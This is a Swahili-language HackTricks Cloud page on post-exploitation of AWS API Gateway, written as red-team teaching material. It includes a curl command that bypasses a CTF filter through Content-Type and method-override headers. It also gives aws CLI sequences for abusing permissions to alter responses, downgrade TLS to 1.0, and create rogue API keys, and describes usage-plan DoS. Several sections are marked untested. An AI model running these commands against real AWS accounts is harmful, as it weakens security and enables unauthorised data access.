# AWS - Uchimbaji wa Baada ya Uvamizi wa API Gateway

{% hint style="success" %}
&#x20;Jifunze & zoezi la Uchimbaji wa AWS:<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks ya Mtaalam wa Timu Nyekundu ya AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
&#x20;Jifunze & zoezi la Uchimbaji wa GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks ya Mtaalam wa Timu Nyekundu ya GCP (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za uchimbaji kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## API Gateway

Kwa habari zaidi angalia:

{% content-ref url="../aws-services/aws-api-gateway-enum.md" %}
[aws-api-gateway-enum.md](../aws-services/aws-api-gateway-enum.md)
{% endcontent-ref %}

### Kufikia APIs zisizofichuliwa

Unaweza kuunda mwisho katika [https://us-east-1.console.aws.amazon.com/vpc/home#CreateVpcEndpoint](https://us-east-1.console.aws.amazon.com/vpc/home?region=us-east-1#CreateVpcEndpoint:) na huduma `com.amazonaws.us-east-1.execute-api`, fichua mwisho katika mtandao ambapo una ufikivu (labda kupitia mashine ya EC2) na weka kikundi cha usalama kuruhusu mawasiliano yote.\
Kisha, kutoka kwenye mashine ya EC2 utaweza kufikia mwisho na hivyo kuita API ya lango ambayo haikufichuliwa awali.

### Kupita kwenye Uhamishaji wa Mwili wa Ombi

Mbinu hii iligunduliwa katika [**hii CTF writeup**](https://blog-tyage-net.translate.goog/post/2023/2023-09-03-midnightsun/?\_x\_tr\_sl=en&\_x\_tr\_tl=es&\_x\_tr\_hl=en&\_x\_tr\_pto=wapp).

Kama ilivyoelezwa katika [**nyaraka za AWS**](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-apigateway-method-integration.html) katika sehemu ya `PassthroughBehavior`, kwa chaguo-msingi, thamani **`WHEN_NO_MATCH`** , wakati wa kuchunguza kichwa cha **Content-Type** cha ombi, itapitisha ombi kwa nyuma bila mabadiliko.

Kwa hivyo, katika CTF lango la API lilikuwa na kigezo cha uingiliano ambacho kilikuwa **kizuizi bendera kutotolewa** katika jibu wakati ombi lilipotumwa na `Content-Type: application/json`:

{% code overflow="wrap" %}
```yaml
RequestTemplates:
application/json: '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename=:moviename","FilterExpression": "not contains(#description, :flagstring)","ExpressionAttributeNames": {"#description": "description"},"ExpressionAttributeValues":{":moviename":{"S":"$util.escapeJavaScript($input.params(''moviename''))"},":flagstring":{"S":"midnight"}}}'
```
{% endcode %}

Walakini, kutuma ombi na **`Content-type: text/json`** ingezuia kichuja hicho.&#x20;

Hatimaye, kwa kuwa Lango la API ilikuwa ikiruhusu tu `Get` na `Options`, ilikuwa inawezekana kutuma ombi la utafutaji wa dynamoDB bila kikomo kutuma ombi la POST na utafutaji kwenye mwili na kutumia kichwa `X-HTTP-Method-Override: GET`:

{% code overflow="wrap" %}
```bash
curl https://vu5bqggmfc.execute-api.eu-north-1.amazonaws.com/prod/movies/hackers -H 'X-HTTP-Method-Override: GET' -H 'Content-Type: text/json'  --data '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename = :moviename","ExpressionAttributeValues":{":moviename":{"S":"hackers"}}}'
```
{% endcode %}

### Matumizi ya Mipango ya Matumizi DoS

Katika sehemu ya **Uorodheshaji** unaweza kuona jinsi ya **kupata mpango wa matumizi** wa funguo. Ikiwa una funguo na ime **zuiliwa** kwa matumizi X **kwa mwezi**, unaweza **kuitumia tu na kusababisha DoS**.

**Funguo ya API** inahitaji tu kuwa **imejumuishwa** ndani ya **kichwa cha HTTP** kinachoitwa **`x-api-key`**.

### `apigateway:UpdateGatewayResponse`, `apigateway:CreateDeployment`

Mshambuliaji mwenye ruhusa za `apigateway:UpdateGatewayResponse` na `apigateway:CreateDeployment` anaweza **kurekebisha Jibu la Lango lililopo ili kujumuisha vichwa vya desturi au templeti za majibu zinazovuja habari nyeti au kutekeleza hati za malicious**.
```bash
API_ID="your-api-id"
RESPONSE_TYPE="DEFAULT_4XX"

# Update the Gateway Response
aws apigateway update-gateway-response --rest-api-id $API_ID --response-type $RESPONSE_TYPE --patch-operations op=replace,path=/responseTemplates/application~1json,value="{\"message\":\"$context.error.message\", \"malicious_header\":\"malicious_value\"}"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Madhara Yanayoweza Kutokea**: Kutokwa na taarifa nyeti, kutekeleza script za uovu, au kupata ufikivu usioruhusiwa kwenye rasilimali za API.

{% hint style="info" %}
Inahitajika kupimwa
{% endhint %}

### `apigateway:UpdateStage`, `apigateway:CreateDeployment`

Mshambuliaji mwenye ruhusa za `apigateway:UpdateStage` na `apigateway:CreateDeployment` anaweza **kubadilisha hatua ya sasa ya API Gateway kurekebisha trafiki kuelekezwa kwenye hatua tofauti au kubadilisha mipangilio ya kuhifadhi ili kupata ufikivu usioruhusiwa wa data iliyohifadhiwa**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
STAGE_NAME="Prod"

# Update the API Gateway stage
aws apigateway update-stage --rest-api-id $API_ID --stage-name $STAGE_NAME --patch-operations op=replace,path=/cacheClusterEnabled,value=true,op=replace,path=/cacheClusterSize,value="0.5"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Athari Inayowezekana**: Upatikanaji usiohalali wa data iliyohifadhiwa, kuvuruga au kuingilia trafiki ya API.

{% hint style="info" %}
Inahitaji majaribio
{% endhint %}

### `apigateway:PutMethodResponse`, `apigateway:CreateDeployment`

Mshambuliaji mwenye ruhusa za `apigateway:PutMethodResponse` na `apigateway:CreateDeployment` anaweza **kurekebisha jibu la mbinu ya API ya Gateway ya REST iliyopo ili kujumuisha vichwa vya desturi au templeti za majibu ambazo hufichua habari nyeti au kutekeleza hati za malicious**.
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
STATUS_CODE="200"

# Update the method response
aws apigateway put-method-response --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --status-code $STATUS_CODE --response-parameters "method.response.header.malicious_header=true"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Athari Inayoweza Kutokea**: Kuvuja kwa taarifa nyeti, kutekeleza scripti zenye nia mbaya, au kupata ufikivu usioruhusiwa kwenye rasilimali za API.

{% hint style="info" %}
Inahitaji majaribio
{% endhint %}

### `apigateway:UpdateRestApi`, `apigateway:CreateDeployment`

Mshambuliaji mwenye ruhusa za `apigateway:UpdateRestApi` na `apigateway:CreateDeployment` anaweza **kubadilisha mipangilio ya API Gateway REST API kwa kuzima kuingiza kumbukumbu au kubadilisha toleo la chini la TLS, hivyo kupunguza usalama wa API**.
```bash
API_ID="your-api-id"

# Update the REST API settings
aws apigateway update-rest-api --rest-api-id $API_ID --patch-operations op=replace,path=/minimumTlsVersion,value='TLS_1.0',op=replace,path=/apiKeySource,value='AUTHORIZER'

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Athari Inayowezekana**: Kupunguza usalama wa API, ikiruhusu ufikiaji usioruhusiwa au kufichua habari nyeti.

{% hint style="info" %}
Inahitaji majaribio
{% endhint %}

### `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, `apigateway:CreateUsagePlanKey`

Mshambuliaji mwenye ruhusa za `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, na `apigateway:CreateUsagePlanKey` anaweza **kuunda funguo mpya za API, kuzihusisha na mipango ya matumizi, na kuzitumia funguo hizi kwa ufikiaji usioruhusiwa wa API**.
```bash
# Create a new API key
API_KEY=$(aws apigateway create-api-key --enabled --output text --query 'id')

# Create a new usage plan
USAGE_PLAN=$(aws apigateway create-usage-plan --name "MaliciousUsagePlan" --output text --query 'id')

# Associate the API key with the usage plan
aws apigateway create-usage-plan-key --usage-plan-id $USAGE_PLAN --key-id $API_KEY --key-type API_KEY
```
**Athari Inayowezekana**: Upatikanaji usiohalali wa rasilimali za API, kukiuka udhibiti wa usalama.

{% hint style="info" %}
Inahitaji majaribio
{% endhint %}

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya HackTricks AWS)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
